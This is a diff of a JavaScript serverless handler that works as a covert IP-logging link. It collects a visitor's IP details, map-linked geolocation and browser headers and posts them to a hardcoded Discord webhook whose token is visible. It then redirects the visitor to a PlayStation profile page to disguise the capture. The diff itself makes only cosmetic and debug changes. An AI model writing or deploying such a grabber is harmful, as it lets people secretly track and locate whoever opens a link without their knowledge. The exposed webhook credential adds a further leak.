@@ -2,7 +2,6 @@ import fetch from 'node-fetch';
 
 const webhookUrl = "https://discord.com/api/webhooks/1317579965285531648/IyHYlXpJrQjNnFwG7N7MMusqOGxoJITSPHbIdkWfDaaMX-okBoxRL0cmGmyrT89dyd69";
 
-
 async function sendToWebhook(message) {
     try {
         const response = await fetch(webhookUrl, {
@@ -59,12 +58,15 @@ export default async function handler(req, res) {
             return;
         }
 
+        // Debug: Check the hosting value in ipDetails
+        console.log("Hosting status:", ipDetails.hosting);
+
         const userAgent = req.headers['user-agent'] || 'Unknown';
         const acceptLanguage = req.headers['accept-language'] || 'Unknown';
         const acceptEncoding = req.headers['accept-encoding'] || 'Unknown';
         const doNotTrack = req.headers['dnt'] === '1' ? 'Yes' : 'No';
         const referer = req.headers['referer'] || 'No referer';
-
+        
         const deviceType = detectDeviceType(userAgent);
         const browserEngine = /Chrome|Chromium|Edg/.test(userAgent) ? 'Blink' :
                               /Safari/.test(userAgent) ? 'WebKit' :
@@ -79,7 +81,6 @@ export default async function handler(req, res) {
             ? `[${ipDetails.lat}, ${ipDetails.lon}](https://www.google.com/maps?q=${ipDetails.lat},${ipDetails.lon})`
             : "Not available";
 
-      // Check 1: Google LLC and Discordbot
         const message = ipDetails.hosting
             ? {
                 embeds: [
@@ -95,14 +96,7 @@ export default async function handler(req, res) {
                     }
                 ]
             }
-
-
-
-       
-
-
-        // Default: Full Info for Other Requests
-       : {
+            : {
                 embeds: [
                     {
                         title: "User Opened Link",
@@ -136,10 +130,10 @@ export default async function handler(req, res) {
                     }
                 ]
             };
- // Send the message to the webhook
+
+        // Send the message to the webhook
         await sendToWebhook(message);
-
-
+        
         res.writeHead(302, { Location: 'https://profile.playstation.com/LB7' });
         res.end();
     } else {
